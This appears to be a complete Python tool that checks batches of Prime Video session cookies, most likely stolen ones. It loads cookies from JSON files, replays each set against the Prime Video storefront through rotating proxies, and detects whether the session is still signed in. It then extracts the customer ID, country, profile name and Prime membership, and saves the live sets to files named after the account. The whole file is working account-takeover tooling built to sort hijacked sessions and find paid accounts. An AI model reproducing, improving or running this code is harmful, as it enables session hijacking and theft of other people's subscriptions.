import json
import os
import re
import sys
import time
import requests
import tkinter as tk
from tkinter import filedialog
from requests.exceptions import RequestException, ConnectionError, Timeout
from http.client import RemoteDisconnected
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import ctypes
from dataclasses import dataclass


# ─────────────────────────────────────────────────────────────────────────────
# Init
# ─────────────────────────────────────────────────────────────────────────────
init()

BANNER = f"""{Fore.CYAN}
██████╗ ██████╗ ██╗███╗   ███╗███████╗██╗   ██╗██╗██████╗ ███████╗ ██████╗ 
██╔══██╗██╔══██╗██║████╗ ████║██╔════╝██║   ██║██║██╔══██╗██╔════╝██╔═══██╗
██████╔╝██████╔╝██║██╔████╔██║█████╗  ██║   ██║██║██║  ██║█████╗  ██║   ██║
██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝  ╚██╗ ██╔╝██║██║  ██║██╔══╝  ██║   ██║
██║     ██║  ██║██║██║ ╚═╝ ██║███████╗ ╚████╔╝ ██║██████╔╝███████╗╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝  ╚═══╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝
{Style.RESET_ALL}"""
print(BANNER)
print(f"{Fore.YELLOW}Initializing, please wait...\n{Fore.RESET}")

# ─────────────────────────────────────────────────────────────────────────────
# Global state
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class AppState:
    working_cookies_path: str = "working_cookies"
    failed_cookies_path: str = "failed_cookies"
    exceptions: int = 0
    working_cookies: int = 0
    expired_cookies: int = 0
    duplicate_cookies: int = 0
    processed_cookies: int = 0
    total_cookies: int = 0
    prime_members: int = 0
    failed_cookies: int = 0

lock = Lock()
proxy_lock = Lock()
num_threads = 5
start = time.time()
state = AppState()  # Define the maximum number of threads here

# ───────────────────────────────────────────────────────
# | Network Speed  | Recommended threads                |
# |----------------|-------------------------------------|
# | < 5 Mbps       | 1-3                                |
# | 5-20 Mbps      | 3-5                                |
# | 20-100 Mbps    | 5-10                               |
# | > 100 Mbps     | 10-20                              |
# ───────────────────────────────────────────────────────

max_retries = 3  # Define the maximum number of retries

# Timeout constants (seconds)
REQUEST_TIMEOUT = 20
PROXY_CHECK_TIMEOUT = 8
RETRY_DELAY = 1

# Proxy globals (populated during setup)
valid_proxies: list = []  # list of {"http": url, "https": url}
proxy_index = 0
USE_PROXY = False


# ─────────────────────────────────────────────────────────────────────────────
# Extraction helpers
# ─────────────────────────────────────────────────────────────────────────────

# Prime Video config API endpoint
PV_CONFIG_URL = "https://atv-ps.primevideo.com/acm/GetConfiguration/WebClient?deviceTypeID=AOAGZA014O5RE&deviceID=Web"

PV_HEADERS = {
    "Host": "www.primevideo.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Accept-Encoding": "identity",
}


def get_config_api(session, proxy=None):
    """Call Prime Video config API to get customer/region data."""
    headers = dict(PV_HEADERS)
    headers.update({
        "Host": "atv-ps.primevideo.com",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://www.primevideo.com/region/eu/storefront",
    })
    try:
        resp = session.get(PV_CONFIG_URL, headers=headers, timeout=(5, 8), proxies=proxy)
        if resp.status_code == 200:
            return resp.json() or {}
    except (RequestException, ConnectionError, Timeout):
        pass
    return {}


def extract_info(response_text: str, config_data: dict | None = None) -> dict:
    result = {}
    m = re.search(r'<script id="dv-web-global-store-data"[^>]*>(.*?)</script>', response_text, re.DOTALL)
    if m:
        try:
            data = json.loads(m.group(1))
            ctx = data.get("RequestContext", {})
            if ctx.get("customerID"):
                result["customerID"] = str(ctx["customerID"])
            if ctx.get("recordTerritory"):
                result["countryOfSignup"] = str(ctx["recordTerritory"]).upper()
        except (json.JSONDecodeError, KeyError, TypeError):
            pass
    if config_data and not result.get("countryOfSignup"):
        r = config_data.get("recordTerritory", "")
        if r and len(str(r)) == 2:
                result["countryOfSignup"] = str(r).upper()
    m = re.search(r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false)', response_text, re.IGNORECASE)
    if m:
        result["is_paid"] = m.group(1).lower() == "true"
        result["membership"] = "Prime Member" if result["is_paid"] else "Free Account"
    elif re.search(r"subscribe now", response_text, re.IGNORECASE):
            result["membership"] = "Free Account"
    elif re.search(r"prime", response_text, re.IGNORECASE):
            result["membership"] = "Prime Member"
    m = re.search(r'data-testid="active-profile-([^"]+)"', response_text)
    if m:
            result["profile"] = m.group(1)
    return result



def is_signed_out(response_text: str, final_url: str) -> bool:
    """Check if cookie is signed out using specific Prime Video page markers."""
    # URL redirect check
    if "signin" in final_url.lower() and "primevideo" not in final_url.lower():
        return True
    if "/ap/signin" in final_url.lower():
        return True

    # Page content markers - positive (signed IN indicators)
    if 'data-testid="pv-nav-sign-out"' in response_text:
        return False  # Definitely signed in
    if 'data-testid="active-profile-' in response_text:
        return False  # Profile visible = signed in
    if re.search(r'"watchlistAction"', response_text, re.IGNORECASE):
        return False  # Page loaded with watchlist = signed in

    # Negative (sign-in page indicators)
    if 'data-testid="pv-nav-sign-in"' in response_text:
        if re.search(r'/auth-redirect/', response_text) and 'signin=1' in response_text:
            return True
    if re.search(r'/(?:ap|gp)/signin', response_text, re.IGNORECASE):
        return True

    return False  # Default: assume signed in if not clearly signed out



def load_cookies_from_json(path: str) -> list:
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    # Support both formats:
    #  - New: {"cookies": [...], "_meta": {...}}
    #  - Old: [...] (plain list, possibly with metadata mixed in)
    if isinstance(data, dict) and "cookies" in data:
        return [c for c in data["cookies"] if isinstance(c, dict) and "name" in c and "value" in c]
    if isinstance(data, list):
        return [c for c in data if isinstance(c, dict) and "name" in c and "value" in c]
    return []


# ─────────────────────────────────────────────────────────────────────────────
# Proxy utilities
# ─────────────────────────────────────────────────────────────────────────────

def get_next_proxy() -> dict | None:
    """Return next proxy via round-robin (thread-safe)."""
    global proxy_index
    if not valid_proxies:
        return None
    with proxy_lock:
        p = valid_proxies[proxy_index % len(valid_proxies)]
        proxy_index += 1
    return p


def ask_yes_no(prompt: str) -> bool:
    while True:
        ans = input(prompt + " [y/n]: ").strip().lower()
        if ans in ("y", "yes"):
            return True
        if ans in ("n", "no"):
            return False
        print(f"{Fore.RED}  Please enter y or n.{Fore.RESET}")


def pick_proxy_file() -> str | None:
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    path = filedialog.askopenfilename(
        title="Select proxy file",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
    )
    root.destroy()
    return path or None


def pick_proxy_type() -> str:
    options = {"1": "http", "2": "https", "3": "socks4", "4": "socks5"}
    print(f"{Fore.CYAN}\nSelect proxy type:{Fore.RESET}")
    for k, v in options.items():
        print(f"  [{k}] {v.upper()}")
    while True:
        choice = input("  Enter number (1-4): ").strip()
        if choice in options:
            return options[choice]
        print(f"{Fore.RED}  Invalid choice, try again.{Fore.RESET}")


def parse_proxy_line(line: str, proxy_type: str) -> str | None:
    """
    Parse a proxy line in any of these formats:
      host:port
      host:port:user:pass
      user:pass@host:port
    Returns a full proxy URL or None if un-parseable.
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "@" in line:
        return f"{proxy_type}://{line}"
    parts = line.split(":")
    if len(parts) == 2:
        return f"{proxy_type}://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        host, port, user, passwd = parts
        return f"{proxy_type}://{user}:{passwd}@{host}:{port}"
    return None


def validate_proxy(proxy_url: str, timeout: int = PROXY_CHECK_TIMEOUT) -> bool:
    proxies = {"http": proxy_url, "https": proxy_url}
    try:
        r = requests.get("https://www.google.com", proxies=proxies, timeout=timeout)
        return r.status_code == 200
    except Exception:
        return False


def load_and_validate_proxies(filepath: str, proxy_type: str) -> list:
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        raw_lines = f.readlines()

    proxy_urls = [u for u in (parse_proxy_line(l, proxy_type) for l in raw_lines) if u]

    if not proxy_urls:
        print(f"{Fore.RED}[⚠️]  No parseable proxies found in the file.{Fore.RESET}")
        return []

    print(f"{Fore.YELLOW}\n[🔍] Validating {len(proxy_urls)} proxies, please wait...{Fore.RESET}")

    good = []
    bad_count = 0
    checked_count = 0
    total_count = len(proxy_urls)
    c_lock = Lock()

    def _check(url: str):
        nonlocal bad_count, checked_count
        ok = validate_proxy(url)
        with c_lock:
            checked_count += 1
            if ok:
                good.append({"http": url, "https": url})
                print(Fore.GREEN + f"  [✔] LIVE  — {url}" + Fore.RESET)
            else:
                bad_count += 1
                print(Fore.RED + f"  [✘] DEAD  — {url}" + Fore.RESET)
            # Update terminal title with proxy validation progress
            title_str = f"Prime Video | Validating Proxies [{checked_count}/{total_count}] | ✅ Live: {len(good)} | ❌ Dead: {bad_count}"
            if os.name == 'nt':
                try:
                    ctypes.windll.kernel32.SetConsoleTitleW(title_str)
                except Exception:
                    pass
            else:
                sys.stdout.write(f"\033]0;{title_str}\007")
                sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=min(20, len(proxy_urls))) as ex:
        for _ in as_completed([ex.submit(_check, u) for u in proxy_urls]):
            pass

    print(
        Fore.YELLOW + f"\n[📊] Proxy validation done — "
        + Fore.GREEN + f"{len(good)} live"
        + Fore.YELLOW + " / "
        + Fore.RED + f"{bad_count} dead"
        + Fore.RESET + "\n"
    )
    return good


# ─────────────────────────────────────────────────────────────────────────────
# Proxy setup entry-point
# ─────────────────────────────────────────────────────────────────────────────

def setup_proxies() -> None:
    global valid_proxies, USE_PROXY

    if not ask_yes_no(f"{Fore.CYAN}Do you want to use proxies?{Fore.RESET}"):
        print(f"{Fore.YELLOW}[ℹ️]  Running without proxies.\n{Fore.RESET}")
        return

    print(f"{Fore.CYAN}\n[📂] A file picker will open — select your proxy list...{Fore.RESET}")
    proxy_file = pick_proxy_file()
    if not proxy_file:
        print(f"{Fore.RED}[⚠️]  No file selected. Running without proxies.\n{Fore.RESET}")
        return

    print(Fore.GREEN + f"[✔]  Proxy file : {proxy_file}" + Fore.RESET)

    proxy_type = pick_proxy_type()
    print(Fore.GREEN + f"[✔]  Proxy type : {proxy_type.upper()}\n" + Fore.RESET)

    validated = load_and_validate_proxies(proxy_file, proxy_type)
    if not validated:
        print(f"{Fore.RED}[⚠️]  No live proxies found. Running without proxies.\n{Fore.RESET}")
        return

    valid_proxies = validated
    USE_PROXY = True
    print(Fore.GREEN + f"[✔]  {len(valid_proxies)} live proxies loaded. Proxy mode ON.\n" + Fore.RESET)


# ─────────────────────────────────────────────────────────────────────────────
# Core cookie checker
# ─────────────────────────────────────────────────────────────────────────────

def open_webpage_with_cookies(session: requests.Session, link: str, json_cookies: list, filename: str) -> tuple:
    """Returns (True, membership, email, country, profile, customer_id) on success, else (False, None, None, None, "", "", "expired")."""

    session.cookies.clear()
    for cookie in json_cookies:
        if "name" not in cookie or "value" not in cookie:
            continue
        session.cookies.set(cookie["name"], cookie["value"])

    session.headers.update({
        "Accept-Encoding": "identity",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    })

    if USE_PROXY:
        proxy = get_next_proxy()
        if proxy:
            session.proxies.update(proxy)

    attempt = 0
    while attempt < max_retries:
        try:
            response = session.get(link, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            response.raise_for_status()
            content = response.text
            config_data = get_config_api(session, session.proxies if USE_PROXY else None)
            info = extract_info(content, config_data)

            # Logged-out detection using Prime Video page markers
            final_url = response.url.lower()
            signed_out = is_signed_out(content, final_url)

            if signed_out:
                with lock:
                    print(Fore.RED + f"[❌] Cookie expired/signed out — {filename}" + Fore.RESET)
                    state.expired_cookies += 1
                return (False, None, None, None, "", "", "expired")

            # ── Membership ──
            membership = info.get("membership") or "Not Prime"
            profile = info.get("profile", "")
            customer_id = info.get("customerID", "")

            # ── Email (Prime Video doesn't expose email, use profile name) ──
            email = info.get("emailAddress") or profile or "Unknown"

            # ── Country ──
            country = info.get("countryOfSignup") or "Unknown"

            # Track Prime members
            if "Prime" in membership:
                with lock:
                    state.prime_members += 1

            # Validate: if we can't identify the account, mark as expired
            # (no customerID + no country = can't verify account ownership)
            if not customer_id and country == "Unknown":
                with lock:
                    print(f"{Fore.RED}[❌] Cookie loaded but cannot verify account (no customerID/country) — expired ({filename}){Fore.RESET}")
                    state.expired_cookies += 1
                return (False, None, None, None, "", "", "expired")

            os.makedirs(state.working_cookies_path, exist_ok=True)
            return (True, membership, email, country, profile, customer_id)

        except (RequestException, ConnectionError, RemoteDisconnected) as e:
            with lock:
                print(f"{Fore.RED}[⚠️] Request error: {e!s} — {filename} (attempt {attempt + 1}/{max_retries}){Fore.RESET}")
            attempt += 1
            if USE_PROXY:
                proxy = get_next_proxy()
                if proxy:
                    session.proxies.update(proxy)
            time.sleep(RETRY_DELAY * (attempt + 1))  # Exponential backoff

    with lock:
        print(Fore.RED + f"[❌] Network failed after {max_retries} attempts — {filename}" + Fore.RESET)
    return (False, None, None, None, "", "", "network_error")


def process_cookie_file(filename: str) -> None:

    filepath = os.path.join("json_cookies", filename)

    url = "https://www.primevideo.com/region/eu/storefront"
    try:
        cookies = load_cookies_from_json(filepath)
        with requests.Session() as session:
            result = open_webpage_with_cookies(session, url, cookies, filename)
            success, membership, email, country, *rest = result
            profile = rest[0] if len(rest) > 0 else ""
            customer_id = rest[1] if len(rest) > 1 else ""
            failure_reason = rest[2] if len(rest) > 2 else ""
            if success:
                # Sanitize user identifier (profile name) for use in filename
                safe_email = re.sub(r'[<>:"/\\|?*]', '_', email or "unknown")
                out_name = f"[ {country} ] - [ {customer_id} ] - [ {safe_email} ] - {membership}.txt"
                out_path = os.path.join(state.working_cookies_path, out_name)

                with lock:
                    if os.path.isfile(out_path):
                        print(f"{Fore.YELLOW}[⚠️] Duplicate — {filename} | Membership: {membership} | User: {email} | ID: {customer_id}{Fore.RESET}")
                        state.duplicate_cookies += 1
                    else:
                        with open(out_path, "w", encoding="utf-8") as jf:
                            json.dump(cookies, jf, indent=4)
                        state.working_cookies += 1
                        proxy_tag = (
                            f" | Proxy: {session.proxies.get('http', 'n/a')}"
                            if USE_PROXY else ""
                        )
                        print(
                            Fore.GREEN
                            + f"[✔️] Working — [{country}] {filename} | "
                            + f"Membership: {membership} | User: {email} | ID: {customer_id}"
                            + f"{proxy_tag}"
                            + Fore.RESET
                        )

            elif failure_reason == "network_error":
                os.makedirs(state.failed_cookies_path, exist_ok=True)
                failed_path = os.path.join(state.failed_cookies_path, filename)
                with open(failed_path, "w", encoding="utf-8") as jf:
                    json.dump(cookies, jf, indent=4)
                with lock:
                    state.failed_cookies += 1
                    print(Fore.YELLOW + f"[SAVE] Saved to failed_cookies/ - {filename} (retry later)" + Fore.RESET)

    except json.decoder.JSONDecodeError:
        with lock:
            print(f"{Fore.RED}[⚠️] Invalid JSON — use cookie_converter.py to fix ({filename}){Fore.RESET}")
            state.exceptions += 1

    except Exception as e:
        with lock:
            print(Fore.RED + f"[⚠️] Error: {e!s} — {filename}" + Fore.RESET)
            state.exceptions += 1

    finally:
        with lock:
            state.processed_cookies += 1
            p, t, w, e, ex, fc = state.processed_cookies, state.total_cookies, state.working_cookies, state.expired_cookies, state.exceptions, state.failed_cookies
        update_title(p, t, w, e, ex, fc)


# ─────────────────────────────────────────────────────────────────────────────
# Terminal title updater
# ─────────────────────────────────────────────────────────────────────────────

def update_title(processed: int = 0, total: int = 0, working: int = 0,
                  expired: int = 0, error_count: int = 0, failed: int = 0):
    """Update terminal title with live progress (I/O — caller should NOT hold locks)."""
    emoji_check = "\u2705"   # ✅
    emoji_cross = "\u274C"   # ❌
    emoji_retry = "\U0001F504"  # 🔄
    emoji_warn = "\u26A0"    # ⚠️
    title_str = (
        f"Prime Video | [{processed}/{total}] "
        f"| {emoji_check} Work: {working} "
        f"| {emoji_cross} Exp: {expired} "
        f"| {emoji_retry} Retry: {failed} "
        f"| {emoji_warn} Err: {error_count}"
    )
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title_str)
        except (OSError, AttributeError):
            pass  # silently ignore if console title API is unavailable
    else:
        sys.stdout.write(f"\033]0;{title_str}\007")
        sys.stdout.flush()


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():

    # 1. Proxy setup (ask, file-pick, validate) before any checking starts
    setup_proxies()

    # 2. Verify cookie directory
    cookie_dir = "json_cookies"
    if not os.path.isdir(cookie_dir):
        print(f"{Fore.RED}[⚠️] 'json_cookies' directory not found.\n     Create it and place your JSON cookies inside, then re-run.{Fore.RESET}")
        input(f"{Fore.CYAN}\nPress Enter to exit...{Fore.RESET}")
        sys.exit(1)

    files = [f for f in os.listdir(cookie_dir) if os.path.isfile(os.path.join(cookie_dir, f))]
    if not files:
        print(f"{Fore.RED}[⚠️] 'json_cookies' is empty.\n     Use cookie_converter.py to convert your cookies first.{Fore.RESET}")
        input(f"{Fore.CYAN}\nPress Enter to exit...{Fore.RESET}")
        sys.exit(1)

    state.total_cookies = len(files)


    if os.path.isdir(state.working_cookies_path):
        print(
            f"{Fore.YELLOW}[ℹ️]  '{state.working_cookies_path}' already exists — new results will be appended.\n{Fore.RESET}"
        )
    if os.path.isdir(state.failed_cookies_path):
        print(
            f"{Fore.YELLOW}[ℹ️]  '{state.failed_cookies_path}' already exists — network-failed cookies will be saved for retry.\n{Fore.RESET}"
        )

    proxy_info = (
        f"ON ({len(valid_proxies)} live)" if USE_PROXY else "OFF"
    )
    print(f"{Fore.CYAN}[🚀] Starting — {len(files)} cookie(s) | threads: {num_threads} | proxy: {proxy_info}\n{Fore.RESET}")

    # 3. Run checker
    update_title()
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(process_cookie_file, files)


if __name__ == "__main__":
    try:
        main()
        end = time.time()
        elapsed = round(end - start)

        proxy_summary = (
            f"Yes ({len(valid_proxies)} live)" if USE_PROXY else "No"
        )

        print(
            Fore.YELLOW
            + "\n==================================="
            + f"\n  {Fore.LIGHTCYAN_EX}Summary{Fore.YELLOW}"
            + f"\n  Total cookies      : {Fore.CYAN}{state.total_cookies}{Fore.YELLOW}"
            + f"\n  Working cookies    : {Fore.GREEN}{state.working_cookies}{Fore.YELLOW}"
            + f"\n  Prime members      : {Fore.MAGENTA}{state.prime_members}{Fore.YELLOW}"
            + f"\n  Expired cookies    : {Fore.RED}{state.expired_cookies}{Fore.YELLOW}"
            + f"\n  Network failed     : {Fore.LIGHTYELLOW_EX}{state.failed_cookies} (saved in failed_cookies/){Fore.YELLOW}"
            + f"\n  Duplicate cookies  : {Fore.LIGHTYELLOW_EX}{state.duplicate_cookies}{Fore.YELLOW}"
            + f"\n  Errors / invalid   : {Fore.RED}{state.exceptions}{Fore.YELLOW}"
            + f"\n  Proxies used       : {Fore.CYAN}{proxy_summary}{Fore.YELLOW}"
            + f"\n  Time elapsed       : {Fore.LIGHTBLACK_EX}{elapsed}s{Fore.YELLOW}"
            + "\n==================================="
            + Fore.RESET
        )
        if state.failed_cookies > 0:
            print(Fore.CYAN + "\n[Tip] Move files from failed_cookies/ to json_cookies/ and re-run to retry!" + Fore.RESET)
        input(f"{Fore.CYAN}\nPress Enter to exit...{Fore.RESET}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[⚠️] Interrupted by user.{Fore.RESET}")
        input(f"{Fore.CYAN}\nPress Enter to exit...{Fore.RESET}")
